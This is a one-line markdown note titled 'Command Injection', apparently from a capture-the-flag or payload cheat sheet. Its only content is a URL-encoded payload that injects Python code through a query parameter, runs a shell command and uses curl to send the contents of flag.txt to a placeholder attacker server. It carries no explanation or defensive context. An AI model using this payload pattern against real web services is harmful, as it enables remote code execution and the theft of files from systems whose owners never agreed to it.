# Command Injection

```
http://127.0.0.1/old?inject=__import__(%27os%27).system(%27curl%20http://ATTACKER_SERVER/$(cat%20flag.txt)%27)
```
